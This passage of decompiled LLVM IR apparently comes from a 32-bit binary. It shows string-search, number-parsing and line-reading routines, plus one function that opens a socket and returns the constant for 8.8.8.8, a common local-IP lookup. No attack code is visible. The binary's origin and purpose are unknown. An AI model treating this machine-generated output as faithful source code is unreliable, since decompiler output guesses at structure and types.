  %v0_1000ac681 = phi i32 [ %v1_1000ac6c, %dec_label_pc_1000ac80 ], [ 0, %dec_label_pc_1000ac5c ]
  %v1_1000ac60 = add i32 %v0_1000ac84, 1
  %v1_1000ac64 = add i32 %v0_1000ac64, -1
  %v2_1000ac64 = icmp eq i32 %v1_1000ac64, 0
  br i1 %v2_1000ac64, label %dec_label_pc_1000ac3c, label %dec_label_pc_1000ac68

dec_label_pc_1000ac68:                            ; preds = %dec_label_pc_1000ac60, %dec_label_pc_1000ac4c
  %v0_1000ac64 = phi i32 [ %v1_1000ac64, %dec_label_pc_1000ac60 ], [ %arg2, %dec_label_pc_1000ac4c ]
  %v0_1000ac84 = phi i32 [ %v1_1000ac60, %dec_label_pc_1000ac60 ], [ 0, %dec_label_pc_1000ac4c ]
  %v0_1000ac68 = phi i32 [ %v0_1000ac681, %dec_label_pc_1000ac60 ], [ 0, %dec_label_pc_1000ac4c ]
  %v2_1000ac68 = add i32 %v0_1000ac68, %arg3
  %v3_1000ac68 = inttoptr i32 %v2_1000ac68 to i8*
  %v4_1000ac68 = load i8, i8* %v3_1000ac68, align 1
  %v1_1000ac6c = add i32 %v0_1000ac68, 1
  %v2_1000ac70 = add i32 %v0_1000ac84, %arg1
  %v3_1000ac70 = inttoptr i32 %v2_1000ac70 to i8*
  %v4_1000ac70 = load i8, i8* %v3_1000ac70, align 1
  %v4_1000ac78 = icmp eq i8 %v4_1000ac70, %v4_1000ac68
  br i1 %v4_1000ac78, label %dec_label_pc_1000ac80, label %dec_label_pc_1000ac5c

dec_label_pc_1000ac80:                            ; preds = %dec_label_pc_1000ac68
  %v4_1000ac74 = icmp eq i32 %v1_1000ac6c, %arg4
  br i1 %v4_1000ac74, label %dec_label_pc_1000ac84, label %dec_label_pc_1000ac60

dec_label_pc_1000ac84:                            ; preds = %dec_label_pc_1000ac80
  %v1_1000ac84 = add i32 %v0_1000ac84, 1
  ret i32 %v1_1000ac84

; uselistorder directives
  uselistorder i32 %v0_1000ac68, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac3c, { 0, 2, 1 }
}

define i32 @function_1000ac8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %r5.global-to-local = alloca i32, align 4
  %v0_1000ac8c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ac8c

dec_label_pc_1000ac8c:                            ; preds = %dec_label_pc_1000aca8, %dec_label_pc_1000ac8c, %bb
  %v0_1000ac8c = phi i32 [ %v0_1000ac8c.pre, %bb ], [ %v1_1000ac90, %dec_label_pc_1000ac8c ], [ %v1_1000ac90, %dec_label_pc_1000aca8 ]
  %v1_1000ac8c = inttoptr i32 %v0_1000ac8c to i8*
  %v2_1000ac8c = load i8, i8* %v1_1000ac8c, align 1
  %v1_1000ac90 = add i32 %v0_1000ac8c, 1
  %v3_1000ac9c = icmp eq i8 %v2_1000ac8c, 32
  br i1 %v3_1000ac9c, label %dec_label_pc_1000ac8c, label %dec_label_pc_1000aca8

dec_label_pc_1000aca8:                            ; preds = %dec_label_pc_1000ac8c
  %v2_1000ac8c.off = add i8 %v2_1000ac8c, -9
  %tmp = icmp ult i8 %v2_1000ac8c.off, 2
  br i1 %tmp, label %dec_label_pc_1000ac8c, label %dec_label_pc_1000acb4

dec_label_pc_1000acb4:                            ; preds = %dec_label_pc_1000aca8
  %v3_1000acb4 = icmp eq i8 %v2_1000ac8c, 45
  br i1 %v3_1000acb4, label %dec_label_pc_1000ad60, label %dec_label_pc_1000acbc

dec_label_pc_1000acbc:                            ; preds = %dec_label_pc_1000acb4
  %v3_1000acbc = icmp eq i8 %v2_1000ac8c, 43
  br i1 %v3_1000acbc, label %dec_label_pc_1000adb8, label %dec_label_pc_1000acc4

dec_label_pc_1000acc4:                            ; preds = %dec_label_pc_1000acbc, %dec_label_pc_1000adb8
  %v0_1000ad5426 = phi i32 [ %v1_1000ac90, %dec_label_pc_1000acbc ], [ %v1_1000adbc, %dec_label_pc_1000adb8 ]
  %v0_1000ace45.in = phi i8 [ %v2_1000ac8c, %dec_label_pc_1000acbc ], [ %v2_1000adb8, %dec_label_pc_1000adb8 ]
  br label %dec_label_pc_1000acd0

dec_label_pc_1000acd0:                            ; preds = %dec_label_pc_1000ad60, %dec_label_pc_1000acc4
  %v0_1000ad5425 = phi i32 [ %v1_1000ad68, %dec_label_pc_1000ad60 ], [ %v0_1000ad5426, %dec_label_pc_1000acc4 ]
  %v0_1000ace44.in = phi i8 [ %v2_1000ad60, %dec_label_pc_1000ad60 ], [ %v0_1000ace45.in, %dec_label_pc_1000acc4 ]
  %v0_1000ada8 = phi i32 [ 1, %dec_label_pc_1000ad60 ], [ 0, %dec_label_pc_1000acc4 ]
  %v1_1000ace0 = phi i32 [ -2147483648, %dec_label_pc_1000ad60 ], [ 2147483647, %dec_label_pc_1000acc4 ]
  %v2_1000acd0 = udiv i32 %v1_1000ace0, %arg1
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_1000acdc = mul i32 %v2_1000acd0, %arg1
  %v2_1000ace0 = sub i32 %v1_1000ace0, %v2_1000acdc
  br label %dec_label_pc_1000ace4

dec_label_pc_1000ace4:                            ; preds = %dec_label_pc_1000ad54, %dec_label_pc_1000acd0
  %v0_1000ad54 = phi i32 [ %v1_1000ad58, %dec_label_pc_1000ad54 ], [ %v0_1000ad5425, %dec_label_pc_1000acd0 ]
  %v0_1000ad48 = phi i32 [ %v0_1000ad4017, %dec_label_pc_1000ad54 ], [ 0, %dec_label_pc_1000acd0 ]
  %v0_1000ad38 = phi i32 [ %v0_1000ad9811, %dec_label_pc_1000ad54 ], [ 0, %dec_label_pc_1000acd0 ]
  %v0_1000ad30 = phi i32 [ %v0_1000ad8c9, %dec_label_pc_1000ad54 ], [ 0, %dec_label_pc_1000acd0 ]
  %v1_1000ad24.in = phi i8 [ %v2_1000ad54, %dec_label_pc_1000ad54 ], [ %v0_1000ace44.in, %dec_label_pc_1000acd0 ]
  %v1_1000ad24 = zext i8 %v1_1000ad24.in to i32
  %v1_1000ace8 = add nsw i32 %v1_1000ad24, -48
  %fold = add nuw nsw i32 %v1_1000ad24, 208
  %v1_1000acf0 = urem i32 %fold, 256
  %tmp27 = icmp ult i32 %v1_1000acf0, 10
  br i1 %tmp27, label %dec_label_pc_1000ad28, label %dec_label_pc_1000acfc

dec_label_pc_1000acfc:                            ; preds = %dec_label_pc_1000ace4
  %v1_1000acfc = add nuw nsw i32 %v1_1000ad24, 191
  %v1_1000ad00 = urem i32 %v1_1000acfc, 256
  %tmp28 = icmp ult i32 %v1_1000ad00, 26
  br i1 %tmp28, label %dec_label_pc_1000ad24, label %dec_label_pc_1000ad10

dec_label_pc_1000ad10:                            ; preds = %dec_label_pc_1000acfc
  %v1_1000ad10 = add nuw nsw i32 %v1_1000ad24, 159
  %v1_1000ad14 = urem i32 %v1_1000ad10, 256
  %v2_1000ad18 = icmp ugt i32 %v1_1000ad14, 25
  br i1 %v2_1000ad18, label %dec_label_pc_1000ad8c, label %dec_label_pc_1000ad20

dec_label_pc_1000ad20:                            ; preds = %dec_label_pc_1000ad10
  br label %dec_label_pc_1000ad24

dec_label_pc_1000ad24:                            ; preds = %dec_label_pc_1000acfc, %dec_label_pc_1000ad20
  %v0_1000ad24 = phi i32 [ 55, %dec_label_pc_1000acfc ], [ 87, %dec_label_pc_1000ad20 ]
  %v2_1000ad24 = sub nsw i32 %v1_1000ad24, %v0_1000ad24
  br label %dec_label_pc_1000ad28

dec_label_pc_1000ad28:                            ; preds = %dec_label_pc_1000ace4, %dec_label_pc_1000ad24
  %v1_1000ad50 = phi i32 [ %v1_1000ace8, %dec_label_pc_1000ace4 ], [ %v2_1000ad24, %dec_label_pc_1000ad24 ]
  %v2_1000ad28 = icmp slt i32 %v1_1000ad50, %arg1
  br i1 %v2_1000ad28, label %dec_label_pc_1000ad30, label %dec_label_pc_1000ad8c

dec_label_pc_1000ad30:                            ; preds = %dec_label_pc_1000ad28
  %v1_1000ad30 = icmp slt i32 %v0_1000ad30, 0
  br i1 %v1_1000ad30, label %dec_label_pc_1000ad74, label %dec_label_pc_1000ad38

dec_label_pc_1000ad38:                            ; preds = %dec_label_pc_1000ad30
  %v3_1000ad38 = icmp ugt i32 %v0_1000ad38, %v2_1000acd0
  br i1 %v3_1000ad38, label %dec_label_pc_1000ad74, label %dec_label_pc_1000ad40

dec_label_pc_1000ad40:                            ; preds = %dec_label_pc_1000ad38
  %v4_1000ad40 = icmp eq i32 %v0_1000ad48, %v2_1000acd0
  br i1 %v4_1000ad40, label %dec_label_pc_1000ad7c, label %dec_label_pc_1000ad48

dec_label_pc_1000ad48:                            ; preds = %dec_label_pc_1000ad7c, %dec_label_pc_1000ad40
  %v2_1000ad48 = mul i32 %v0_1000ad48, %arg1
  %v2_1000ad50 = add i32 %v1_1000ad50, %v2_1000ad48
  store i32 %v2_1000ad50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ad54

dec_label_pc_1000ad54:                            ; preds = %dec_label_pc_1000ad7c, %dec_label_pc_1000ad74, %dec_label_pc_1000ad48
  %v0_1000ad4017 = phi i32 [ %v2_1000acd0, %dec_label_pc_1000ad7c ], [ %v0_1000ad48, %dec_label_pc_1000ad74 ], [ %v2_1000ad50, %dec_label_pc_1000ad48 ]
  %v0_1000ad9811 = phi i32 [ %v2_1000acd0, %dec_label_pc_1000ad7c ], [ %v0_1000ad38, %dec_label_pc_1000ad74 ], [ %v2_1000ad50, %dec_label_pc_1000ad48 ]
  %v0_1000ad8c9 = phi i32 [ -1, %dec_label_pc_1000ad7c ], [ -1, %dec_label_pc_1000ad74 ], [ 1, %dec_label_pc_1000ad48 ]
  %v1_1000ad54 = inttoptr i32 %v0_1000ad54 to i8*
  %v2_1000ad54 = load i8, i8* %v1_1000ad54, align 1
  %v1_1000ad58 = add i32 %v0_1000ad54, 1
  br label %dec_label_pc_1000ace4

dec_label_pc_1000ad60:                            ; preds = %dec_label_pc_1000acb4
  %v1_1000ad60 = inttoptr i32 %v1_1000ac90 to i8*
  %v2_1000ad60 = load i8, i8* %v1_1000ad60, align 1
  %v1_1000ad68 = add i32 %v0_1000ac8c, 2
  br label %dec_label_pc_1000acd0

dec_label_pc_1000ad74:                            ; preds = %dec_label_pc_1000ad38, %dec_label_pc_1000ad30
  br label %dec_label_pc_1000ad54

dec_label_pc_1000ad7c:                            ; preds = %dec_label_pc_1000ad40
  %v3_1000ad7c = icmp sgt i32 %v1_1000ad50, %v2_1000ace0
  br i1 %v3_1000ad7c, label %dec_label_pc_1000ad54, label %dec_label_pc_1000ad48

dec_label_pc_1000ad8c:                            ; preds = %dec_label_pc_1000ad28, %dec_label_pc_1000ad10
  %v1_1000ad8c = icmp slt i32 %v0_1000ad30, 0
  br i1 %v1_1000ad8c, label %dec_label_pc_1000ada8, label %dec_label_pc_1000ad94

dec_label_pc_1000ad94:                            ; preds = %dec_label_pc_1000ad8c
  %v3_1000ad94 = icmp eq i32 %v0_1000ada8, 0
  %v0_1000ad9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ad94, i32 %v0_1000ad9c)
  %v0_1000ada0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ada0 = sub i32 0, %v0_1000ada0
  ret i32 %v1_1000ada0

dec_label_pc_1000ada8:                            ; preds = %dec_label_pc_1000ad8c
  %v1_1000ada8 = xor i32 %v0_1000ada8, 1
  %v2_1000adb0 = sub nuw i32 -2147483648, %v1_1000ada8
  ret i32 %v2_1000adb0

dec_label_pc_1000adb8:                            ; preds = %dec_label_pc_1000acbc
  %v1_1000adb8 = inttoptr i32 %v1_1000ac90 to i8*
  %v2_1000adb8 = load i8, i8* %v1_1000adb8, align 1
  %v1_1000adbc = add i32 %v0_1000ac8c, 2
  br label %dec_label_pc_1000acc4

; uselistorder directives
  uselistorder i32 %v2_1000ad50, { 1, 0, 2 }
  uselistorder i32 %v1_1000ad50, { 1, 0, 2 }
  uselistorder i32 %v1_1000ad24, { 2, 4, 3, 0, 1 }
  uselistorder i32 %v0_1000ad48, { 2, 0, 1 }
  uselistorder i32 %v0_1000ad54, { 1, 0 }
  uselistorder i32 %v2_1000acd0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_1000ac90, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000ac8c, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 208, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 -2147483648, { 1, 0 }
  uselistorder i8 2, { 0, 3, 1, 2 }
  uselistorder i8 32, { 10, 2, 3, 4, 0, 5, 6, 7, 1, 8, 11, 12, 13, 14, 15, 16, 9, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000ad28, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad24, { 1, 0 }
  uselistorder label %dec_label_pc_1000acc4, { 1, 0 }
}

define i32 @function_1000adc4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000adc4:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v0_1000adf0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  br label %dec_label_pc_1000adf8

dec_label_pc_1000adf8:                            ; preds = %dec_label_pc_1000ae24.dec_label_pc_1000adf8_crit_edge, %dec_label_pc_1000adc4
  %v0_1000adfc = phi i32 [ %v0_1000adfc.pre, %dec_label_pc_1000ae24.dec_label_pc_1000adf8_crit_edge ], [ %arg3, %dec_label_pc_1000adc4 ]
  %v0_1000adf8 = phi i32 [ %v1_1000ae10, %dec_label_pc_1000ae24.dec_label_pc_1000adf8_crit_edge ], [ %tmp, %dec_label_pc_1000adc4 ]
  store i32 1, i32* @r5, align 4
  store i32 268480008, i32* @lr, align 4
  %v4_1000ae04 = call i32 @function_1000b628(i32 %v0_1000adfc, i32 %v0_1000adf8, i32 1)
  %v0_1000ae08 = load i32, i32* @r31, align 4
  %v3_1000ae0c = icmp eq i32 %v4_1000ae04, 1
  %v1_1000ae10 = add i32 %v0_1000ae08, 1
  store i32 %v1_1000ae10, i32* @r31, align 4
  %v0_1000ae18 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000ae0c, label %dec_label_pc_1000ae18, label %dec_label_pc_1000ae30

dec_label_pc_1000ae18:                            ; preds = %dec_label_pc_1000adf8
  %v1_1000ae18 = add i32 %v0_1000ae18, 1
  store i32 %v1_1000ae18, i32* %r30.global-to-local, align 4
  %v0_1000ae1c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000ae1c = icmp sgt i32 %v0_1000ae1c, %v1_1000ae18
  br i1 %v3_1000ae1c, label %dec_label_pc_1000ae24, label %dec_label_pc_1000ae30

dec_label_pc_1000ae24:                            ; preds = %dec_label_pc_1000ae18
  %v1_1000ae24 = inttoptr i32 %v0_1000ae08 to i8*
  %v2_1000ae24 = load i8, i8* %v1_1000ae24, align 1
  %v3_1000ae28 = icmp eq i8 %v2_1000ae24, 10
  br i1 %v3_1000ae28, label %dec_label_pc_1000ae30, label %dec_label_pc_1000ae24.dec_label_pc_1000adf8_crit_edge

dec_label_pc_1000ae24.dec_label_pc_1000adf8_crit_edge: ; preds = %dec_label_pc_1000ae24
  %v0_1000adfc.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000adf8

dec_label_pc_1000ae30:                            ; preds = %dec_label_pc_1000adf8, %dec_label_pc_1000ae24, %dec_label_pc_1000ae18
  %v1_1000ae38 = phi i32 [ %v1_1000ae18, %dec_label_pc_1000ae24 ], [ %v1_1000ae18, %dec_label_pc_1000ae18 ], [ %v0_1000ae18, %dec_label_pc_1000adf8 ]
  %tmp12 = icmp slt i32 %v1_1000ae38, 0
  %v1_1000ae30 = zext i1 %tmp12 to i32
  %v2_1000ae30 = ashr i32 %v1_1000ae38, 31
  %v3_1000ae30 = and i32 %v2_1000ae30, -2
  %v4_1000ae30 = or i32 %v3_1000ae30, %v1_1000ae30
  %v2_1000ae38 = xor i32 %v4_1000ae30, %v1_1000ae38
  %v2_1000ae40 = sub i32 %v4_1000ae30, %v2_1000ae38
  %tmp13 = icmp slt i32 %v2_1000ae40, 0
  %v1_1000ae48 = zext i1 %tmp13 to i32
  %v2_1000ae48 = ashr i32 %v2_1000ae40, 31
  %v3_1000ae48 = and i32 %v2_1000ae48, -2
  %v4_1000ae48 = or i32 %v3_1000ae48, %v1_1000ae48
  %v0_1000ae50 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ae50 = and i32 %v4_1000ae48, %v0_1000ae50
  store i32 %v0_1000adf0, i32* @r31, align 4
  ret i32 %v2_1000ae50

; uselistorder directives
  uselistorder i32 %v2_1000ae40, { 1, 0 }
  uselistorder i32 %v4_1000ae30, { 1, 0 }
  uselistorder i32 %v1_1000ae38, { 1, 2, 0 }
  uselistorder i32 %v1_1000ae10, { 1, 0 }
  uselistorder i8 10, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000b628, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000ae30, { 1, 2, 0 }
}

define i32 @function_1000ae68(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ae68:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_1000ae80 = load i32, i32* @r31, align 4
  store i32 16, i32* %stack_var_-40, align 4
  %v0_1000ae88 = call i32 @function_1000bb0c()
  %v2_1000ae94 = inttoptr i32 %v0_1000ae88 to i32*
  store i32 0, i32* %v2_1000ae94, align 4
  store i32 268480164, i32* @lr, align 4
  %v3_1000aea0 = call i32 @function_1000c1bc(i32 2, i32 2, i32 0)
  store i32 %v3_1000aea0, i32* @r3, align 4
  %v3_1000aea8 = icmp eq i32 %v3_1000aea0, -1
  store i32 %v3_1000aea0, i32* @r31, align 4
  br i1 %v3_1000aea8, label %dec_label_pc_1000aef8, label %dec_label_pc_1000aec4

dec_label_pc_1000aec4:                            ; preds = %dec_label_pc_1000ae68
  %v2_1000ae74 = ptrtoint i32* %stack_var_-36 to i32
  store i32 2, i32* %stack_var_-36, align 4
  store i32 268480220, i32* @lr, align 4
  %v0_1000aed8 = call i32 @function_1000bfbc()
  %v2_1000aee0 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000aee4 = load i32, i32* @r31, align 4
  store i32 268480236, i32* @lr, align 4
  %v3_1000aee8 = call i32 @function_1000bff0(i32 %v0_1000aee4, i32 %v2_1000ae74, i32 %v2_1000aee0)
  store i32 268480244, i32* @lr, align 4
  %v0_1000aef0 = call i32 @function_1000b3f0()
  br label %dec_label_pc_1000aef8

dec_label_pc_1000aef8:                            ; preds = %dec_label_pc_1000ae68, %dec_label_pc_1000aec4
  %v0_1000aef8 = phi i32 [ 0, %dec_label_pc_1000ae68 ], [ 134744072, %dec_label_pc_1000aec4 ]
  store i32 %v0_1000ae80, i32* @r31, align 4
  ret i32 %v0_1000aef8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 ()* @function_1000bfbc, { 2, 1, 11, 3, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000c1bc, { 4, 2, 3, 23, 24, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 1, 12, 11, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000aef8, { 1, 0 }
}

define i32 @function_1000af14(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000af14:
  %tmp = inttoptr i32 %arg3 to i8*
  store i32 %arg3, i32* @r5, align 4
  %tmp16 = ptrtoint i8* %arg1 to i32
  %v3_1000af14 = load i8, i8* %tmp, align 1
  %v3_1000af20 = icmp eq i8 %v3_1000af14, 0
  br i1 %v3_1000af20, label %dec_label_pc_1000af38, label %dec_label_pc_1000af28

dec_label_pc_1000af28:                            ; preds = %dec_label_pc_1000af14, %dec_label_pc_1000af28
  %v0_1000af28 = phi i32 [ %v1_1000af28, %dec_label_pc_1000af28 ], [ 0, %dec_label_pc_1000af14 ]
  %v1_1000af28 = add i32 %v0_1000af28, 1
  %v3_1000af2c = add i32 %v1_1000af28, %arg3
  %v4_1000af2c = inttoptr i32 %v3_1000af2c to i8*
  %v5_1000af2c = load i8, i8* %v4_1000af2c, align 1
  %v3_1000af30 = icmp eq i8 %v5_1000af2c, 0
  br i1 %v3_1000af30, label %dec_label_pc_1000af38, label %dec_label_pc_1000af28

dec_label_pc_1000af38:                            ; preds = %dec_label_pc_1000af28, %dec_label_pc_1000af14
  %v0_1000af6811 = phi i32 [ 0, %dec_label_pc_1000af14 ], [ %v1_1000af28, %dec_label_pc_1000af28 ]
  %v1_1000af38 = icmp slt i32 %arg2, 0
  %v1_1000af3c = add i32 %arg2, 1
  br i1 %v1_1000af38, label %dec_label_pc_1000afb4, label %dec_label_pc_1000af50

dec_label_pc_1000af50:                            ; preds = %dec_label_pc_1000af38, %dec_label_pc_1000afb4, %dec_label_pc_1000afa8
  %v2_1000af5c8 = phi i32 [ %v1_1000af60, %dec_label_pc_1000afa8 ], [ 0, %dec_label_pc_1000afb4 ], [ 0, %dec_label_pc_1000af38 ]
  %v0_1000af546 = phi i32 [ %v1_1000af58, %dec_label_pc_1000afa8 ], [ %tmp16, %dec_label_pc_1000afb4 ], [ %tmp16, %dec_label_pc_1000af38 ]
  %v0_1000af50 = phi i32 [ %v0_1000af9c, %dec_label_pc_1000afa8 ], [ 1, %dec_label_pc_1000afb4 ], [ %v1_1000af3c, %dec_label_pc_1000af38 ]
  %v1_1000af50 = add i32 %v0_1000af50, -1
  %v2_1000af50 = icmp eq i32 %v1_1000af50, 0
  br i1 %v2_1000af50, label %dec_label_pc_1000afa0, label %dec_label_pc_1000af54

dec_label_pc_1000af54:                            ; preds = %dec_label_pc_1000af50, %dec_label_pc_1000af98
  %v2_1000af5c = phi i32 [ 0, %dec_label_pc_1000af98 ], [ %v2_1000af5c8, %dec_label_pc_1000af50 ]
  %v0_1000af54 = phi i32 [ %v1_1000af58, %dec_label_pc_1000af98 ], [ %v0_1000af546, %dec_label_pc_1000af50 ]
  %v0_1000af9c = phi i32 [ %v1_1000af9c, %dec_label_pc_1000af98 ], [ %v1_1000af50, %dec_label_pc_1000af50 ]
  %v1_1000af54 = inttoptr i32 %v0_1000af54 to i8*
  %v2_1000af54 = load i8, i8* %v1_1000af54, align 1
  %v3_1000af54 = zext i8 %v2_1000af54 to i32
  %v1_1000af58 = add i32 %v0_1000af54, 1
  %v3_1000af5c = add i32 %v2_1000af5c, %arg3
  %v4_1000af5c = inttoptr i32 %v3_1000af5c to i8*
  %v5_1000af5c = load i8, i8* %v4_1000af5c, align 1
  %v6_1000af5c = zext i8 %v5_1000af5c to i32
  %v1_1000af60 = add i32 %v2_1000af5c, 1
  %v1_1000af64 = add nuw nsw i32 %v3_1000af54, 191
  %v1_1000af6c = urem i32 %v1_1000af64, 256
  %v2_1000af70 = icmp ugt i32 %v1_1000af6c, 25
  %v1_1000af74 = add nuw nsw i32 %v6_1000af5c, 191
  %v1_1000af78 = urem i32 %v1_1000af74, 256
  %v2_1000af7c = icmp ugt i32 %v1_1000af78, 25
  br i1 %v2_1000af70, label %dec_label_pc_1000af88, label %dec_label_pc_1000af84

dec_label_pc_1000af84:                            ; preds = %dec_label_pc_1000af54
  %v1_1000af84 = or i32 %v3_1000af54, 96
  br i1 %v2_1000af7c, label %dec_label_pc_1000af90, label %dec_label_pc_1000af8c

dec_label_pc_1000af88:                            ; preds = %dec_label_pc_1000af54
  br i1 %v2_1000af7c, label %dec_label_pc_1000af90, label %dec_label_pc_1000af8c

dec_label_pc_1000af8c:                            ; preds = %dec_label_pc_1000af84, %dec_label_pc_1000af88
  %v0_1000af9013 = phi i32 [ %v1_1000af84, %dec_label_pc_1000af84 ], [ %v3_1000af54, %dec_label_pc_1000af88 ]
  %v1_1000af8c = or i32 %v6_1000af5c, 96
  br label %dec_label_pc_1000af90

dec_label_pc_1000af90:                            ; preds = %dec_label_pc_1000af84, %dec_label_pc_1000af88, %dec_label_pc_1000af8c
  %v1_1000af90 = phi i32 [ %v6_1000af5c, %dec_label_pc_1000af84 ], [ %v6_1000af5c, %dec_label_pc_1000af88 ], [ %v1_1000af8c, %dec_label_pc_1000af8c ]
  %v0_1000af90 = phi i32 [ %v1_1000af84, %dec_label_pc_1000af84 ], [ %v3_1000af54, %dec_label_pc_1000af88 ], [ %v0_1000af9013, %dec_label_pc_1000af8c ]
  %v4_1000af90 = icmp eq i32 %v0_1000af90, %v1_1000af90
  br i1 %v4_1000af90, label %dec_label_pc_1000afa8, label %dec_label_pc_1000af98

dec_label_pc_1000af98:                            ; preds = %dec_label_pc_1000af90
  %v1_1000af9c = add i32 %v0_1000af9c, -1
  %v2_1000af9c = icmp eq i32 %v1_1000af9c, 0
  br i1 %v2_1000af9c, label %dec_label_pc_1000afa0, label %dec_label_pc_1000af54

dec_label_pc_1000afa0:                            ; preds = %dec_label_pc_1000af50, %dec_label_pc_1000af98
  ret i32 -1

dec_label_pc_1000afa8:                            ; preds = %dec_label_pc_1000af90
  %v4_1000af68.le = icmp eq i32 %v0_1000af6811, %v1_1000af60
  br i1 %v4_1000af68.le, label %dec_label_pc_1000afac, label %dec_label_pc_1000af50

dec_label_pc_1000afac:                            ; preds = %dec_label_pc_1000afa8
  %v2_1000afac = sub i32 %v1_1000af58, %tmp16
  ret i32 %v2_1000afac

dec_label_pc_1000afb4:                            ; preds = %dec_label_pc_1000af38
  br label %dec_label_pc_1000af50

; uselistorder directives
  uselistorder i32 %v1_1000af9c, { 1, 0 }
  uselistorder i32 %v1_1000af84, { 1, 0 }
  uselistorder i1 %v2_1000af7c, { 1, 0 }
  uselistorder i32 %v1_1000af60, { 1, 0 }
  uselistorder i32 %v3_1000af54, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000af9c, { 1, 0 }
  uselistorder i32 %v0_1000af54, { 1, 0 }
  uselistorder i32 %v2_1000af5c, { 1, 0 }
  uselistorder i32 %tmp16, { 2, 0, 1 }
  uselistorder i32 25, { 8, 9, 10, 4, 5, 7, 0, 1, 6, 2, 3, 11, 12, 13 }
  uselistorder i32 191, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000afa0, { 1, 0 }
  uselistorder label %dec_label_pc_1000af90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000af8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000af54, { 1, 0 }
  uselistorder label %dec_label_pc_1000af50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000af28, { 1, 0 }
}

define i32 @function_1000afc0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000afc0:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1000afc0 = load i8, i8* %arg1, align 1
  %v3_1000afc8 = icmp eq i8 %v2_1000afc0, 0
  br i1 %v3_1000afc8, label %dec_label_pc_1000afe0, label %dec_label_pc_1000afd0

dec_label_pc_1000afd0:                            ; preds = %dec_label_pc_1000afc0, %dec_label_pc_1000afd0
  %v0_1000afd0 = phi i32 [ %v1_1000afd0, %dec_label_pc_1000afd0 ], [ 0, %dec_label_pc_1000afc0 ]
  %v1_1000afd0 = add i32 %v0_1000afd0, 1
  %v2_1000afd4 = add i32 %v1_1000afd0, %tmp
  %v3_1000afd4 = inttoptr i32 %v2_1000afd4 to i8*
  %v4_1000afd4 = load i8, i8* %v3_1000afd4, align 1
  %v3_1000afd8 = icmp eq i8 %v4_1000afd4, 0
  br i1 %v3_1000afd8, label %dec_label_pc_1000afe0, label %dec_label_pc_1000afd0

dec_label_pc_1000afe0:                            ; preds = %dec_label_pc_1000afd0, %dec_label_pc_1000afc0
  %v0_1000b000 = phi i32 [ 0, %dec_label_pc_1000afc0 ], [ %v1_1000afd0, %dec_label_pc_1000afd0 ]
  %v1_1000afe0 = inttoptr i32 %arg2 to i8*
  %v2_1000afe0 = load i8, i8* %v1_1000afe0, align 1
  %v3_1000afe8 = icmp eq i8 %v2_1000afe0, 0
  br i1 %v3_1000afe8, label %dec_label_pc_1000b000, label %dec_label_pc_1000aff0

dec_label_pc_1000aff0:                            ; preds = %dec_label_pc_1000afe0, %dec_label_pc_1000aff0
  %v0_1000aff0 = phi i32 [ %v1_1000aff0, %dec_label_pc_1000aff0 ], [ 0, %dec_label_pc_1000afe0 ]
  %v1_1000aff0 = add i32 %v0_1000aff0, 1
  %v2_1000aff4 = add i32 %v1_1000aff0, %arg2
  %v3_1000aff4 = inttoptr i32 %v2_1000aff4 to i8*
  %v4_1000aff4 = load i8, i8* %v3_1000aff4, align 1
  %v3_1000aff8 = icmp eq i8 %v4_1000aff4, 0
  br i1 %v3_1000aff8, label %dec_label_pc_1000b000, label %dec_label_pc_1000aff0

dec_label_pc_1000b000:                            ; preds = %dec_label_pc_1000aff0, %dec_label_pc_1000afe0
  %v0_1000b004 = phi i32 [ 0, %dec_label_pc_1000afe0 ], [ %v1_1000aff0, %dec_label_pc_1000aff0 ]
  %v4_1000b000 = icmp eq i32 %v0_1000b000, %v0_1000b004
